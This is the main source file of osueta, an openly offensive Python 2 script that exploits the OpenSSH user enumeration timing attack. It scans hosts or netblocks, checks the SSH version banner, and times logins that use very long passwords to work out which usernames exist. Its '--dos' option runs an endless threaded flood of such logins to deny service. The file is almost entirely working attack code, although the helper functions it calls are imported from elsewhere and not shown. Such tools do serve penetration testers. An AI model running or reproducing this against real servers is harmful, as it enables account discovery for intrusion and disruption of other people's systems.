#!/usr/bin/python
# -*- coding: utf-8 -*-
__license__="""
osueta (OpenSSH User Enumeration Timing Attack)

Version 0.8

A simple Python2 script to exploit the OpenSSH User Enumeration Timing Attack:

	http://cureblog.de/openssh-user-enumeration-time-based-attack/
	http://seclists.org/fulldisclosure/2013/Jul/88 

Authors:
	c0r3dump3d | coredump<@>autistici.org
	rofen | rofen<@>gmx.de

Osueta project site: https://github.com/c0r3dump3d/osueta 

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.

The authors disclaims all responsibility in the use of this tool.

"""


from osufunc import * 
import argparse
import time
import timeit
try:
	from IPy import IP
except ImportError:
	print "Install IPy module. apt-get install python-ipy." 
		
def main():
 
	parse = argparse.ArgumentParser(description='OpenSSH User Enumeration Time-Based Attack Python script')
        host_group = parse.add_mutually_exclusive_group(required=True)
        user_group = parse.add_mutually_exclusive_group(required=True)
	host_group.add_argument('-H', action='store', dest='host', help='Host Ip or CIDR netblock.')
	host_group.add_argument('-k', action='store', dest='hfile', help='Host list in a file.')
	host_group.add_argument('-f', action='store', dest='fqdn', help='FQDN to attack.')
	parse.add_argument('-p', action='store', dest='port', default='22', help='Host port.')
	user_group.add_argument('-L', action='store', dest='ufile', help='Username list file.')
	user_group.add_argument('-U', action='store', dest='user', help='Only use a single username.')
	parse.add_argument('-d', action='store', dest='delay', help='Time delay fixed in seconds. If not, delay time is calculated.')
	parse.add_argument('-v', action='store', dest='vari',default = 'yes', choices=['yes', 'no'], help='Make variations of the username (default yes).')
	parse.add_argument('-o', action='store', dest='outp', help='Output file with positive results.')
	parse.add_argument('-l', action='store', dest='length', default='40', help='Length of the password in characters (x1000) (default 40).')
	parse.add_argument('-c', action='store', dest='vers', help='Check or not the OpenSSH version (default yes).')
	parse.add_argument('--dos', action='store', dest='dos',default = 'no', help='Try to make a DOS attack (default no).')
	parse.add_argument('-t', action='store', dest='threads',default = '5', help='Threads for the DOS attack (default 5).')
	welcome()
	print "Starting OSUETA v0.8 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X") + " - for legal purposes only."
	print
	start_time = time.time()
	argus=parse.parse_args()

        hosts=[]
        numhost = 0
        vers = argus.vers
        if argus.outp != None:
                fileOutput = open(argus.outp,'w')
                fileOutput.write("OSUETA v0.8 (https://github.com/c0r3dump3d/osueta) at " + time.strftime("%x") + " " + time.strftime("%X") + "\n")
                fileOutput.write("\n")			
                fileOutput.write("USER(s) FOUND:\n")
                fileOutput.write("\n")

        if argus.delay != None:
                defTime = int(argus.delay)		
                print "[+] Using a time delay of " + str(defTime) + " seconds."

        if argus.host != None:
                if "/" in argus.host:
                        try: 
                                for ip in IP(argus.host):
                                        hosts.append(str(ip))
                                        numhost = numhost + 1
                                del hosts[0]
                        except ValueError:
                                print "[-] Invalid host address."
                                exit(1)
                
                else:
                        host = argus.host
                        try:
                                IP(host)
                        except ValueError:
                                print "[-] Invalid host address."
                                exit(1)
                        hosts.append(host)
                        numhost = numhost + 1
        if argus.fqdn != None:
                try:
                        fqdn = argus.fqdn
                        host = socket.gethostbyname(fqdn)
                        hosts.append(host)
                        numhost = numhost + 1
                except socket.gaierror, err:
                        print "[-] Cannot resolve hostname: " + fqdn
                        exit(1)
        if argus.hfile != None:
                try:
                        hostFile = open (argus.hfile,'r')
                except IOError:
                        print "[-] The file %s doesn't exist." % (argus.hfile)
                        exit(1)
                for line in hostFile.readlines():
                        line = line.split("\n")
                        host=line[0]	
                        try:
                                IP(host)
                        except ValueError:
                                print "[-] Invalid host address."
                                exit(1)
                        hosts.append(host)
                        numhost = numhost + 1

        port = argus.port
        vari = argus.vari
        length = int(argus.length)*1000
        print "[+] Using a password with " + str(length) + " characters"
        dos = argus.dos
        if dos == 'yes' and len(hosts) != 1:
                print "[-] DOS option it's only valid for one host."
                exit(1)

        threads = int(argus.threads)
        print "[+] " + str(numhost) + " host(s). It's better a previous fast scan with nmap ..."
        print
        hoststate={}
        userfdos=None
        numop = 0
        start_time = time.time()
        nt = 1
        for ip in hosts:
                print "[+] " + "("+str(nt)+"/"+str(len(hosts))+")"+" Trying " + ip +" ...",
                state=prevScann(ip,port)
                nt = nt + 1
                if state == 'open':
                        numop = numop + 1
                hoststate[ip]=state
        if numop > 0:
                print
                print '[+] Found ' + str(numop) + ' host with port ' + port +' open.'
                print
        else:
                print
                print "[-] No hosts with port " + port + " open."
                print "[-] Nothing to do."
                exit(1)  
        for ip in hosts:
                if hoststate[ip] == 'open':
                        host = ip
                        if argus.ufile != None:
                                try:
                                        userFile = open (argus.ufile,'r')
                                except IOError:
                                        print "[-] The file %s doesn't exist." % (argus.ufile)
                                        exit(1)
                                foundUser = []
                                print
                                if vers == 'yes':

                                        banner = sshBanner(host,port)
                                        bannervuln = ['OpenSSH 5', 'OpenSSH 6']
                                        if banner[0:9] in bannervuln:
                                                print "[++] This version is perhaps vulnerable, we continue with the bruteforce attack ..."
                                                print
                                                print '==============================================================================='
                                                if argus.delay == None:
                                                        delay=dummySSH(host,port,length)
                                                        if delay != None or delay != 0:
                                                                defTime=delay*10
                                                                print "[+] Using a delay of " + str(defTime) + " seconds."
                                                        else:
                                                                defTime = 20
                                                                print "[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds."
                                                userNames = prepareUserNames(userFile,vari)            
                                                for userName in userNames:
                                                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                        fUser = sshTime(host,port,userName,sock,defTime,length)
                                                        if fUser != -1 and fUser !=None:
                                                                foundUser.append(fUser)
                                                        sock.close()
                                                print_success(foundUser, banner)
                                                for entry in foundUser:
                                                        userfdos = entry[0]
                                                        if argus.outp != None:
                                                                fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
                                        else:
                                                print "[-] This version is not vulnerable."
                                                print "[-] Nothing to do."
                                else:
                                        banner = sshBanner(host,port)

                                        if argus.delay == None:
                                                delay=dummySSH(host,port,length)
                                                if delay != None or delay != 0:
                                                        defTime=delay*5
                                                        print "[+] Using a delay of " + str(defTime) + " seconds."
                                                else:
                                                        defTime = 20
                                                        print "[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds."

                                        userNames = prepareUserNames(userFile,vari)            
                                        for userName in userNames:
                                                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                fUser = sshTime(host,port,userName,sock,defTime,length)
                                                if fUser != -1 and fUser !=None:
                                                        foundUser.append(fUser)
                                                sock.close()
                                        print_success(foundUser, banner)
                                        for entry in foundUser:
                                                userfdos = entry[0]
                                                if argus.outp != None:
                                                        fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')

                        else: 
                                print
                                banner = sshBanner(host,port)
                                print
                                foundUser = []
                                user = argus.user
                                
                                if vers == 'yes':
                                        bannervuln = ['OpenSSH 5', 'OpenSSH 6']
                                        if banner[0:9] in bannervuln:
                                                print "[++] This version is perhaps vulnerable, we continue with the bruteforce attack ..."
                                                print
                                                print '==============================================================================='
                                                if argus.delay == None:
                                                        delay=dummySSH(host,port,length)
                                                        if delay != None or delay !=0:
                                                                defTime=delay*10
                                                                print "[+] Using a delay of " + str(defTime) + " seconds."
                                                        else:
                                                                defTime = 20
                                                                print "[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds."
                                                if vari == 'yes':
                                                        userNames =  createUserNameVariationsFor(user)
                                                        userNames = list(set(userNames))
                                                        for userName in userNames:
                                                                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                                fUser = sshTime(host,port,userName,sock,defTime,length)
                                                                if fUser != -1 and fUser !=None:
                                                                        foundUser.append(fUser)
                                                                sock.close()
                                                if vari == 'no':
                                                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                        fUser = sshTime(host,port,user,sock,defTime,length)
                                                        if fUser != -1 and fUser !=None:
                                                                foundUser.append(fUser)
                                                        sock.close()
                                                print_success(foundUser, banner)
                                                for entry in foundUser:
                                                        userfdos = entry[0]
                                                        if argus.outp != None:
                                                                fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
                                        else:
                                                print "[-] This version is not vulnerable."
                                                print "[-] Nothing to do."
                                else:
                                        if vari == 'yes':

                                                if argus.delay == None:
                                                        delay=dummySSH(host,port,length)
                                                        if delay != None or delay != 0:
                                                                defTime=delay*10
                                                                print "[+] Using a delay of " + str(defTime) + " seconds."
                                                        else:
                                                                defTime = 20
                                                                print "[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds."

                                                userNames =  createUserNameVariationsFor(user)
                                                userNames = list(set(userNames))
                                                for userName in userNames:
                                                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                        fUser = sshTime(host,port,userName,sock,defTime,length)
                                                        if fUser != -1 and fUser !=None:
                                                                foundUser.append(fUser)
                                                        sock.close()
                                        if vari == 'no':

                                                if argus.delay == None:
                                                        delay=dummySSH(host,port,length)
                                                        if delay != None or delay != 0:
                                                                defTime=delay*10
                                                                print "[+] Using a delay of " + str(defTime) + " seconds."
                                                        else:
                                                                defTime = 20
                                                                print "[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds."

                                                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                fUser = sshTime(host,port,user,sock,defTime,length)
                                                if fUser != -1 and fUser !=None:
                                                        foundUser.append(fUser)
                                                sock.close()
                                        print_success(foundUser, banner)
                                        for entry in foundUser:
                                                userfdos = entry[0]
                                                if argus.outp != None:
                                                        fileOutput.write(entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds'  + ')\n')
                        if dos == 'yes':
                                if userfdos != None:

                                        print 
                                        print "Trying to establish a DOS condition with user " + userfdos + " and " + str(threads) +  " threads ..."
                                        print "If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop."

                                        while 1:
                                                for att in range(threads):
                                                        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                                                        t = Thread(target=sshDos, args=(host, port, userfdos, sock, length))
                                                        try:
                                                                t.start()
                                                        except KeyboardInterrupt:
                                                                print "Bye !!"
                                                time.sleep(10)
                                else:
                                        print "No user found. Imposible to establish a DOS condition."
                                        exit(1)
	print "\nFinished in", time.time() - start_time, "seconds\n"
